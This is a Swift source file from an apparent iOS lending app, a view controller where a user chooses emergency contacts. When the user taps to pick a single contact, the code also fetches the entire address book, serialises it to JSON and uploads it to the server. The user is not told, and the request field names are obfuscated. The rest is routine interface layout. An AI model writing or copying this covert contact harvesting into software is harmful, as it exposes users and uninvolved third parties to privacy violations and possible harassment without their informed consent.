//
//  PersonalViewController.swift
//  CrediEasy
//
//  Created by Jasper Asher on 2025/9/15.
//

import UIKit
import TYAlertController
import RxSwift

class LoveLifeViewController: BaseViewController {
    
    let disposeBag = DisposeBag()
    
    var productID: String = ""
    
    var pagetitle: String = ""
    
    let viewModel = LoveLifeViewModel()
    
    var model: BaseModel?
    
    let manager = ContactsManager()
    
    var phoneDictArray: [[String: String]] = []
    
    var entertime: String = ""
    
    let pointViewModel = PointViewModel()
    
    lazy var stepView: StepView = {
        let stepView = StepView()
        return stepView
    }()
    
    lazy var whiteView: UIView = {
        let whiteView = UIView(frame: .zero)
        whiteView.backgroundColor = .white
        whiteView.layer.cornerRadius = 25
        whiteView.layer.masksToBounds = true
        return whiteView
    }()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitle("Next", for: .normal)
        nextBtn.titleLabel?.font = UIFont.systemFont(ofSize: 16, weight: UIFont.Weight(500))
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.backgroundColor = UIColor.init(hexString: "#0073E5")
        nextBtn.layer.cornerRadius = 27
        nextBtn.layer.masksToBounds = true
        return nextBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = UIColor.init(hexString: "#F2F8FC")
        tableView.register(LoveLifeViewCell.self, forCellReuseIdentifier: "LoveLifeViewCell")
        tableView.estimatedRowHeight = 80
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.delegate = self
        tableView.dataSource = self
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        view.backgroundColor = UIColor.init(hexString: "#0073E5")
        view.addSubview(headView)
        headView.namelabel.text = pagetitle
        headView.snp.makeConstraints { make in
            make.left.right.equalToSuperview()
            make.height.equalTo(40)
            make.top.equalTo(self.view.safeAreaLayoutGuide.snp.top)
        }
        entertime = String(Int(Date().timeIntervalSince1970))
        
        headView.backBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self else { return }
            let leaveView = LeaveView(frame: self.view.frame)
            if let alertVc = TYAlertController(alert: leaveView, preferredStyle: .alert) {
                self.present(alertVc, animated: true)
            }
            leaveView.leftBtn.rx.tap.subscribe(onNext: { [weak self] in
                self?.dismiss(animated: true)
            }).disposed(by: disposeBag)
            
            leaveView.rightBtn.rx.tap.subscribe(onNext: { [weak self] in
                self?.dismiss(animated: true) {
                    self?.popToSpecificViewController()
                }
            }).disposed(by: disposeBag)
        }).disposed(by: disposeBag)
        
        view.addSubview(stepView)
        stepView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(19)
            make.left.right.equalToSuperview()
            make.height.equalTo(40)
        }
        
        viewModel.getProductDetaiInfo(productID: productID)
        
        viewModel.detailModel.asObservable().subscribe(onNext: { [weak self] model in
            guard let self = self, let model = model else { return }
            let modelArray = model.ande?.beakful ?? []
            stepView.modelArray = modelArray
            stepView.setCurrentIndex(modelArray.count - 2, animated: false)
        }).disposed(by: disposeBag)
        
        view.addSubview(whiteView)
        whiteView.snp.makeConstraints { make in
            make.top.equalTo(stepView.snp.bottom).offset(26)
            make.left.right.equalToSuperview()
            make.bottom.equalToSuperview().offset(20)
        }
        
        view.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom)
            make.left.equalToSuperview().offset(20)
            make.centerX.equalToSuperview()
            make.height.equalTo(54)
        }
        
        whiteView.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalToSuperview()
            make.left.right.equalToSuperview()
            make.bottom.equalTo(nextBtn.snp.top).offset(-10)
        }
        
        viewModel.getPersonalInfo(with: productID) { model in
            self.model = model
            self.tableView.reloadData()
        }
        
        nextBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self, let modelArray = self.model?.ande?.roosing else { return }
            var dict = ["fuckups": productID]
            phoneDictArray.removeAll()
            modelArray.forEach { model in
                let dict = ["banshees": model.banshees ?? "",
                            "carmela": model.carmela ?? "",
                            "semaphorically": model.semaphorically ?? ""]
                self.phoneDictArray.append(dict)
            }
            do {
                let jsonData = try JSONSerialization.data(withJSONObject: phoneDictArray, options: [])
                if let jsonString = String(data: jsonData, encoding: .utf8) {
                    dict["ande"] = jsonString
                    safeInfo(with: dict)
                }
            }catch {
                
            }
        }).disposed(by: disposeBag)
        
    }
    
    private func safeInfo(with dict: [String: Any]) {
        viewModel.safePersonalInfo(wit: dict) { model in
            if model.larcenable == "0" || model.larcenable == "00" {
                self.popToSpecificViewController()
                self.pointViewModel.getMonesesInfo(with: "7", pergamos: self.entertime, paludicoline: String(Int(Date().timeIntervalSince1970)))
            }
            ToastShowMessage.showToast(message: model.hypsodonty ?? "")
        }
    }
    
}

extension LoveLifeViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 0.01
    }
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView? {
        let headView = UIView()
        return headView
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.model?.ande?.roosing?.count ?? 0
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = self.model?.ande?.roosing?[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "LoveLifeViewCell", for: indexPath) as! LoveLifeViewCell
        cell.backgroundColor = .clear
        cell.selectionStyle = .none
        cell.model = model
        cell.clickBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self, let model = model else { return }
            cellClickModel(with: model, cell: cell)
        }).disposed(by: disposeBag)
        
        cell.clickPhoneBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self, let model = model else { return }
            
            manager.fetchAllContacts(from: self) { contacts in
                let encoder = JSONEncoder()
                encoder.outputFormatting = .prettyPrinted
                do {
                    let data = try encoder.encode(contacts)
                    let jsonStr = String(data: data, encoding: .utf8) ?? ""
                    print("jsonStr========\(jsonStr)")
                    let dict = ["ande": jsonStr]
                    self.viewModel.pushMessageInfo(to: dict)
                } catch {
                    print("JSONERROR=========\(error)")
                }
            }
            
            manager.pickSingleContact(from: self) { contact in
                if let c = contact {
                    cell.phoneNumberTx.text = "\(c.banshees)-\(c.anthemwise)"
                    model.banshees = c.banshees
                    model.semaphorically = c.anthemwise
                } else {
                    print("CANCEL========CANCEL")
                }
            }
            
        }).disposed(by: disposeBag)
        return cell
    }
    
    private func cellClickModel(with model: revolutionisedModel, cell: LoveLifeViewCell) {
        let popEnumView = PopEnmuView(frame: self.view.frame)
        popEnumView.model = model
        let alertVc = TYAlertController(alert: popEnumView, preferredStyle: .actionSheet)!
        self.present(alertVc, animated: true)
        popEnumView.cancelBtn.rx.tap.subscribe(onNext: { [weak self] in
            self?.dismiss(animated: true)
        }).disposed(by: disposeBag)
        
        popEnumView.sureBlock = { index in
            self.dismiss(animated: true) {
                cell.phoneTx.text = model.scalping?[index].banshees ?? ""
                cell.model?.whens = model.scalping?[index].banshees ?? ""
                let derailer = model.scalping?[index].derailer ?? 0
                cell.model?.carmela = derailer == 0 ? "" : String(model.scalping?[index].derailer ?? 0)
            }
        }
    }

}
